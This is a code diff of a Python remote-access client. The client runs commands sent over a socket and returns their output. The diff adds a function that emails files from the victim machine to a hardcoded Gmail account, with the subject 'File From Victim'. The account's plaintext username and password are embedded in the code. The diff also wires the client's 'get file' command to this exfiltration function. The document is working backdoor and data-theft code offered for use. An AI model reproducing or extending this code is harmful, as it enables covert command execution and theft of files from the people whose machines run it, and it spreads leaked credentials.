@@ -1,24 +1,41 @@
 import os
 import socket
 import subprocess
-from django.core.mail import EmailMessage
+import smtplib
+from email import encoders
+from email.mime.base import MIMEBase
+from email.mime.multipart import MIMEMultipart
+from email.utils import formatdate
 
 
-
-
-def attachment_email(request):
-    email = EmailMessage(
-        'Hello',  # subject
-        'Body goes here',  # body
-        'MyEmail@MyEmail.com',  # from
-        ['SendTo@SendTo.com'],  # to
-        ['bcc@example.com'],  # bcc
-        reply_to=['other@example.com'],
-        headers={'Message-ID': 'foo'},
-    )
-
-    email.attach_file('/my/path/file')
-    email.send()
+def attachment_email(path):
+    file = path
+    username = 'yehonatanavi21@gmail.com'
+    password = 'yehonatan123'
+    send_from = 'yehonatanavi21@gmail.com'
+    send_to = send_from
+    Cc = 'recipient'
+    msg = MIMEMultipart()
+    msg['From'] = send_from
+    msg['To'] = send_to
+    msg['Cc'] = Cc
+    msg['Date'] = formatdate(localtime=True)
+    msg['Subject'] = 'File From Victim'
+    server = smtplib.SMTP('smtp.gmail.com')
+    port = '587'
+    fp = open(file, 'rb')
+    part = MIMEBase('application', 'vnd.ms-excel')
+    part.set_payload(fp.read())
+    fp.close()
+    encoders.encode_base64(part)
+    part.add_header('Content-Disposition', 'attachment', filename='Name File Here')
+    msg.attach(part)
+    smtp = smtplib.SMTP('smtp.gmail.com')
+    smtp.ehlo()
+    smtp.starttls()
+    smtp.login(username, password)
+    smtp.sendmail(send_from, send_to.split(',') + msg['Cc'].split(','), msg.as_string())
+    smtp.quit()
 
 
 def files_list(path):
@@ -50,17 +67,14 @@ def client():
             try:
                 data = data.replace('cmd ', '')
                 s.send(subprocess.check_output(data))
+
+
             except Exception:
                 s.send(f"Error with {data} command".encode('utf-8'))
 
         elif 'get file' in data:
             data = data.replace('get file ', '')
-            content = bytes(file_size(data) * 1030)
-            with open(data, 'rb') as file:
-                for line in file.readline():
-                    content += line
-            s.send(content)
-
+            attachment_email(data)
 
         else:
             s.send('The command was not found'.encode('utf-8'))
